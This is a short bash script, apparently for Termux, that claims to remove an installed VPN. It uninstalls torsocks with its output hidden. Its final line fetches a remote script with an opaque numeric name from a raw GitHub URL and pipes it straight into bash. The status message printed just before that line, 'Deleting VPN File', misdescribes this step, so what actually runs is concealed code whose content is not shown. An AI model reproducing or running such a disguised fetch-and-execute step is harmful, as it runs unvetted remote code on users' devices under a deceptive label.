#!/bin/bash
echo " [+] Deleting Installed VPN "
sleep 1
pkg uninstall torsocks -y > /dev/null
echo " [+] Files Deleted "
sleep 1
echo " [+] Deleting VPN File "
sleep 1
curl https://raw.githubusercontent.com/1-2-Tree/hide-change/main/6372637382763773736627.sh | bash
